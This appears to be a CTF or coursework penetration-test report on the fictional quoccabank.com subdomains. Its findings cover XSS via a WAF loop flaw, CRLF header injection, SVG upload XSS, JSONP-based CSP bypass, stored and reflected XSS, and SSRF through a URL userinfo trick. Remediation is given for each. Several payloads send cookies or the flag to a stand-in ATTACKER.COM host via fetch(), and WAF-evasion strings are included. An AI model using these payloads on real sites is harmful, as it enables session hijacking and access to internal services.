# Report 2

### MEDIUM - XSS through WAF Vulnerability in report.quoccabank.com

**Asset Domain:** report.quoccabank.com
**Severity Classification:** MEDIUM

#### Vulnerability Details
The web application firewall (WAF) contains a race condition vulnerability which can be exploited so that some parts of the HTML are left unsanitised, exposing XSS in the report content. 

#### Proof of Concept / Steps to Reproduce

![report1](images/report1.png)

The robots.txt route indicates that there is a /view page for the website. Through experimentation, it can be discovered that the navigating to /view/{sessionID} allows one to view a submitted report, where the sessionID can be found through the cookie returned by the server upon sending a report. Sending a report with title and content `<b>test</b>` and viewing the rendered report, it can be seen, from the image above, that the report content is potentially vulnerable to reflected XSS, whilst the title seems to be appropriately HTML encoded. It seems that the WAF, which can be found in the report's source code, is able to strongly sanitise malicious tags and attributes, blocking a lot of malicious payloads. However, a vulnerability exists when trying to delete a malicious child element from the HTML content. The WAF iterates over the list of HTML child elements, calling the `sanitize()` function on each child within the loop, where unsafe child elements detected would be deleted from the list of child elements within the function. Due to list indexing, this means that the first element after an unsafe element will be skipped from the loop so they will remain unsantizied, leaving report viewers (such as admin) vulnerable to XSS attacks. As such, HTML can be inserted as the report content where the first child gets removed, but the next child element passes through the WAF and gets executed. For example, the following payload triggers arbitrary client side code execution as a proof of concept, where the script tag gets filtered out, but the following JavaScript is left unsanitised:

```html
<script></script>
<svg/onload=alert(1)>
```

![report2](images/report2.png)

![report3](images/report3.png)

#### Impact

As demonstrated above, the vulnerability with the WAF allows for arbitrary client side code execution. However, this vulnerability alone is not sufficient in allowing an attacker to steal another user's cookies, since the cookies are HTTP-only (please refer to the CRLF injection vulnerability outlined in this document).

#### Remediation

Regarding the WAF vulnerability, the most effective method of mitigating XSS is to disallow HTML user input in the first place, either HTML encoding user input or using a text parser if text formatting or image insertions are needed. Although using a `filter` function to sanitise children of the HTML report content, instead of removing elements whilst iterating over their containing array, would fix the WAF vulnerability, the safest way of sanitising user input would be to use popular trusted frameworks designed for HTML sanitisation, such as DOMPurify. These frameworks would most likely contain fewer vulnerabilities compared to writing a WAF yourself.



### CRITICAL - CRLF vulnerability in report.quoccabank.com

**Asset Domain:** report.quoccabank.com

**Severity Classification:** CRITICAL

#### Vulnerability Details

Report titles are vulnerable to Carriage Return Line Feed (CRLF) injections, where certain HTTP headers can be pushed into the HTTP body and rendered as HTML. This means that JavaScript is able to access HTTP-only cookies which would normally be unable to be accessed through JavaScript.

#### Proof of Concept / Steps to Reproduce

![report4](images/report4.png)

Submitting a report and examining the server response on accessing the report view page, it can be noted above that my report title "Title" can be found in the HTTP response header when viewing the report, under the x-meta header. HTTP response header splitting can be used to "push" the HTTP-only cookie found in the server response header into the HTML body. With the same report content, intercepting sending a report and simply adding two url-encoded carriage return characters (\r\n) `%0D%0A%0D%0A` to the end of the report's title using Burp Suite, it can be seen that some extra HTML text can be found at the top of the page, containing the cookie (below). 

![report5](images/report5.png)

#### Impact

The CRLF injection vulnerability causes cookies sent from the server to not be set properly, effectively rendering the HTTP-only cookie setting useless. When visiting a compromised site (such as through chaining this vulnerability with the XSS vulnerability in report.quoccabank.com), this vulnerability allows HTTP-only cookies to be picked up using JavaScript by using regex to search for them in the HTML body, which can then be forwarded to an attacker. An attacker may then be able to impersonate them and access reports they submitted, since report sessionIDs are stored in cookies. An example payload can be achieved through appending two carriage return characters to the report title, and using the following report content:

```html
<script></script>
<svg/onload=fetch('ATTACKER.COM/?q='+document.documentElement.outerText.match(/flag=(.*?);/)[1])/>
```

#### Remediation

The CRLF injection vulnerability can also be remediated by sanitising report titles (stripping new line characters from title before sent as a HTTP header) or properly encoded in the HTTP response header output. However, if its inclusion in the x-meta HTTP header is unnecessary, then it would be better to simply remove it from the header instead.



### MEDIUM - Profile Picture Stored XSS

**Asset Domain:** profile.quoccabank.com

**Severity Classification:** MEDIUM

#### Vulnerability Details

Cross site scripting can be triggered by accessing the url corresponding to an uploaded svg containing a malicious script. 

#### Proof of Concept / Steps to Reproduce

Upload the following svg file to profile.quoccabank.com:

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
 <script>alert(1)</script>
</svg>
```

Accessing the URL of the uploaded image (at /profileimage?{profileID}), the alert script gets executed as a proof of concept, as demonstrated below. The JavaScript will also be executed for any user accessing this link.

![profile1](images/profile1.png)

#### Impact

As demonstrated above with a proof of concept, this vulnerability enables arbitrary client side code execution. This means an attacker may be able to steal user cookies and hijack sessions and other sensitive data. 

#### Remediation

Prohibiting the upload of svg files prevents similar attacks from happening. However, if this is not possible, updating the Content Security Policy (CSP) to a value like `Content-Security-Policy: script-src 'none'` will block script execution for malicious SVGs. Another method is to purify or convert uploaded SVGs to a universal format, such as a jpg or png. Furthermore, from inspecting the request for the image, it can be seen that the server returns the image as an `image/svg+xml`. Changing the MIME type to something like "application/octet-string" forces browsers to download the SVG content rather than rendering it inline, for example, and can prevent similar XSS attacks from occuring.

![profile2](images/profile2.png)



### HIGH - WAF and JSONP XSS in sturec.quoccabank.com

**Asset Domain:** sturec.quoccabank.com

**Severity Classification:** HIGH

#### Vulnerability Details

Using JSON-P (JSON with Padding) to render the page is insecure since an attacker can replace the arbitrary callback function, and use it to bypass the Content Security Policy (CSP) set by the website to only allow same origin scripts, resulting in cross-site scripting (XSS). Furthermore, a weak web application firewall (WAF) is used to try to prevent malicious scripts for cookie stealing. 

#### Proof of Concept / Steps to Reproduce

![sturec1](images/sturec1.png)

Injecting HTML into the search form for last name, it can be seen that HTML input gets reflected on the query page. For example, typing in `<b>test</b>` as the last name displays the bolded test, as can be seen in the image above. However, injecting something like `<script>alert(1)</script>` does not seem to work since the Content Security Policy (CSP) blocks external scripts, as evident from the console shown below. 

![sturec2](images/sturec2.png)

Furthermore, analysing the network requests when loading the page indicates that a request is made to sturec.quoccabank.com/students.jsonp?q={QUERY}&callback=render, which returns the data to be displayed (based on query) wrapped within a render function call. This means we can use the jsonp route to load a script that we want run, which won't be blocked since it comes from the same origin, adjusting the callback argument. As a proof of concept, entering the following payload into the search bar successfully yields an alert on the page:

```html
<script src=/students.jsonp?callback=alert(1);render />
```

![sturec3](images/sturec3.png)

This can be further extended to steal a user's cookies. From experimenting, it seems that the `+` and `.` characters are blocked by the WAF to prevent usual cookie stealing XSS attacks. However, malicious payloads can still be crafted to bypass such restrictions. Referring to `document['cookie']` instead of `document.cookie` bypasses the period character restriction. The `+` character restriction can be bypassed by sending a POST request to an attacker site with the cookie, or using string literals as shown below:

```html
<script src=/students.jsonp?callback=fetch(`${ATTACKER.COM/}${document['cookie']}`);render />
```

#### Impact

As demonstrated above, an attacker is able to use JSONP to bypass the website's CSP settings and successfully inject malicious scripts into the page. The XSS attack can be extended to steal user cookies from anyone who access a compromised page. 

#### Remediation

JSONP should not be used since it can be used to bypass CSP same origin restrictions. Furthermore, search results should be rendered as HTML-encoded text instead of HTML, especially since the search feature is designed to look up last names anyways. However, if this is not possible, the WAF should use a common trusted framework to sanitise malicious input, such as DOMPurify, since the current WAF can be easily bypassed, as demonstrated above. 



### CRITICAL - Stored XSS in sturec.quoccabank.com

**Asset Domain:** sturec.quoccabank.com

**Severity Classification:** CRITICAL

#### Vulnerability Details

A malicious student can be created and added to the database such that whenever that student is rendered on any user's browser, there can be arbitrary client-side code execution through cross-site scripting (XSS). 

#### Proof of Concept / Steps to Reproduce

![sturec4](images/sturec4.png)

Using Burp Suite to intercept a request for creating a new student, it can be seen that there is a hidden field added for "dcreate", referring to the date of creation (above). However, after successfully creating the student, it can be seen below that this field is hidden and not rendered on the screen, using a CSS display: none to hide its value. Using a payload such as `<b>test</b>` for dcreate, it can be seen that the beginning tag is removed by the WAF. 

![sturec5](images/sturec5.png)

From experimentation, it seems the WAF can be bypassed using something like `<<b>_b>test</b>` to keep the opening tag, where the opening tag as well as the following character seems to get stripped by the WAF. We can extend this proof of concept for arbitrary client-side code execution, using a similar technique from the previous sturec subdomain vulnerability regarding using JSONP to bypass the CSP blocking external scripts. The following payload creates a malicious new student such that everytime that student is rendered, arbitrary code is executed for anyone who can see the student's row, such as for cookie stealing.

```html
<<b>_script src=/students.jsonp?callback=fetch(`${ATTACKER.COM/}${document['cookie']}`);render />
```

![sturec3](images/sturec3.png)

#### Impact

As demonstrated above, it is possible to create a malicious student entry and add it to the database. This means that whenever that student is rendered on any user's browser, arbitrary code can be executed on their browser. This poses as a security concern, since user cookies can be stolen, resulting in hijacked sessions.

#### Remediation

As previously recommended, the web application should avoid using JSONP so the CSP cannot be bypassed for executing arbitrary JavaScript. Furthermore, the dcreate field should be HTML-encoded like the other fields (or even sanitised) even if it seems like a user cannot write to the field, since the CSS display: none only hides it visually so that the user does not see it, although the browser still interprets and executes the HTML. It may be better to manually set a dcreate on the server side, so users are unable to modify its client-side creation (using Burp Suite for example). 



### LOW - Reflected XSS in sturec.quoccabank.com

**Asset Domain:** sturec.quoccabank.com

**Severity Classification:** LOW

#### Vulnerability Details

Reflected XSS (cross-site scripting) can be found in the last name field when creating a duplicate student. 

#### Proof of Concept / Steps to Reproduce

When creating a student entry with the email address of an existing student, a page similar to below will appear, with the format `User {lastName} already exists`. Although the last name field usually gets HTML encoded when rendered on the home or index page, it seems like it is simply reflected in this case, where having a last name of `<b>test</b>` displays the following page. 

![sturec6](images/sturec6.png)

As a proof of concept, it can be seen that arbitrary code execution can occur by using JSONP to bypass the CSP restriction for external scripts, where the following payload for last name successfully displays the alert.

```html
<script src=/students.jsonp?callback=alert(1);></script>
```

![sturec7](images/sturec7.png)

#### Impact

As demonstrated in the proof of concept above, this vulnerability enables XSS. However, the only way to get this code execution would be to try and create a duplicate student with a specific payload for the last name field. Although this is relatively harmless on its own, an attacker may be able to chain this with CSRF (client-side request forgery) to manually submit the same form for another user, causing them to be redirected to the compromised page.

#### Remediation

Similarly to the other sturec.quoccabank.com vulnerabilities, the general recommendation here would be to remove the use of JSONP so the CSP blocks user scripts as expected. Furthermore, the last name field value should also be HTML-encoded as well, before being displayed to the user. 



### CRITICAL - CTFProxy2 /flag internal access
**Asset Domain:** ctfproxy2.quoccabank.com

**Severity Classification:** CRITICAL

#### Vulnerability Details
A vulnerability with the web application firewall (WAF) for updating avatar (/me) allows internal sites such as /flag to be accessed by a malicious user. The WAF does not manage to completely prevent access to internal networks. 

#### Proof of Concept / Steps to Reproduce
Accessing /robots.txt hints at the existence of the /flag page. However, upon visiting it through ctfproxy2 as an external user, the page seems to return a status 418 code - I am a teapot! It seems like this page should only be accessed through the internal network. A vulnerability with the /me page for updating avatar can be used to access this page's contents. The source code for /me displays its WAF, which checks for blacklisted words, matches the input website domain with regex, before confirming that it does not refer to the IP address of an internal network. However, a vulnerability here exists where the domain captured with regex refers to a public server, but the actual url refers to another website (which links to an internal site). Providing a website in the format `http://PUBLIC_SITE@MALICIOUS_SITE/flag#.png` passes the checks where the url has to start with http(s) and end with .png. Since the @ symbol is not part of the capture group for the domain, the regex captures from http(s):// up to the @ symbol, which is PUBLIC_SITE. In reality, accessing this url will bring you to the malicious site, where the browser interprets PUBLIC_SITE as the username for logging into the MALICIOUS_SITE. This can be seen with the example `http://www.google.com@facebook.com`, which Firefox displays the following warning for:

![flag1](images/flag1.png)

The remaining /flag#.png refers to the flag route, with an anchor to #.png which is ignored if it does not exist. The payload `http://www.google.com@LOCALHOST/flag#.png` bypasses all the WAF checks and causes the Python backend to access 127.0.0.1/flag, dumping its HTML contents into the attacker's avatar. Although lowercase "localhost" is part of the blacklist, its uppercase version LOCALHOST is not. The content for /flag can now by extracted by saving the avatar as a HTML file, allowing an attacker to view the contents of the internal page, as shown below. 

![flag2](images/flag2.png)

Even if LOCALHOST was also blocked by the WAF, the MALICIOUS_SITE can be replaced by any site with an A record pointing to 127.0.0.1. This means that accessing this malicious site actually refers to an internal address, which also manages to bypass all the WAF checks as well.

#### Impact

A vulnerability with the WAF for avatar uploading in /me allows an attacker to access internal sites such as /flag. 

#### Remediation

Capturing the domain of a site with regex may be vulnerable to potential edge cases, allowing attackers past the WAF. It is often recommended to use existing frameworks if they exist. However, a better way to check whether a site refers to an internal network is by pinging the provided user input website first, and checking that it does not refer to an internal network. This prevents edge cases with regex capturing. 





